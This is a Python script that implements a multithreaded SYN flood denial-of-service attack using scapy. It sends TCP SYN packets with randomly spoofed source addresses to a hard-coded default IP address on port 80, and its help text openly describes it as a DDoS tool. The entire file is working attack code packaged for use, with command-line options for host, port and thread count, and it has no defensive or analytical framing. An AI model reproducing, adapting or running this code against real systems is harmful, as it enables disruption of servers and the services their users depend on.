# -*- coding: utf-8 -*-
"""
Created on Tue May 15 11:49:33 2018

@author: DrLC
"""

import random
import sys
import threading
import time
import scapy.all as sca            

THREAD_DEFAULT = 1000
TARGET_DEFAULT = "47.94.138.231"
PORT_DEFAULT = 80

def print_help():
    
    print ()
    print ("+--------------------------+")
    print ("|                          |")
    print ("|      SYN Flood           |")
    print ("|                          |")
    print ("|       by TakingOffPKU    |")
    print ("|                          |")
    print ("+--------------------------+")
    print ()
    print ("DDoS the target server process with toy-like SYN flood.")
    print ()
    print ("Use the following command to start attacking.")
    print ("  python3 %s" % (sys.argv[0]))
    print ("Optional arguments are:")
    print ("  -H or --host\tIP address of the server.")
    print ("  -P or --port\tPort of the server.")
    print ("  -T or --thread\tMultithread.")
    print ("Example:")
    print ("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
           % (sys.argv[0]))
    print ()
    
def getopt(ARGS):
    
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"host": TARGET_DEFAULT,
           "port": PORT_DEFAULT,
           "thread": THREAD_DEFAULT}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-H', '--host']:
                ret['host'] = str(ARGS[i+1])
            if ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i+1])
            if ARGS[i] in ['-T', '--thread']:
                ret['thread'] = int(ARGS[i+1])
            else:
                try:
                    assert False
                except:
                   print_help()
                   exit(0)
    return ret
                
class sendSYN(threading.Thread):

    THREAD = 0
    
    def __init__(self, target, port):
        try:
            self.__target = target
            self.__port = port
            self.__id = sendSYN.THREAD
            sendSYN.THREAD += 1
            threading.Thread.__init__(self)
        except KeyboardInterrupt:
            print ("\nSYN flood attack ends!")
            exit(0)
        
    def __del__(self):
        try:
            sendSYN.THREAD -= 1
        except KeyboardInterrupt:
            print ("\nSYN flood attack ends!")
            exit(0)
        
    def run(self):
        try:
            i = sca.IP()
            t = sca.TCP()
            print ("\r%d threads running" % sendSYN.THREAD, end="")
            i.src = ("%i.%i.%i.%i" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254)))
            i.dst = self.__target
            t.sport = random.randint(2048, 65535)
            t.dport = self.__port
            t.flags = 'S'
            sca.send(i/t, verbose=0)
            return
        except  KeyboardInterrupt:
            print ("\nSYN flood attack ends!")
            exit(0)

if __name__ == "__main__":
    
    args = getopt(sys.argv)
    print ()
    print ("+--------------------------+")
    print ("|                          |")
    print ("|      SYN Flood           |")
    print ("|                          |")
    print ("|       by TakingOffPKU    |")
    print ("|                          |")
    print ("+--------------------------+")
    print ()
    print ("Host: %s" % args["host"])
    print ("Port: %d" % args["port"])
    print ("Thread: %d" % args["thread"])
    print ()
    print ("SYN flood attack will begin in")
    countdown = 5
    for i in range(countdown, 0, -1):
        string = '\r'
        for j in range(countdown, i-1, -1):
            string += str(j)+"..."
        print (string, end="")
        time.sleep(1)
    print ("\nSYN flood attack begins!")

    while True:
        try:
            if sendSYN.THREAD <= args['thread']:
                tmp = sendSYN(args['host'], args['port'])
                tmp.start()
        except KeyboardInterrupt:
            print ("\nSYN flood attack ends!")
            exit(0)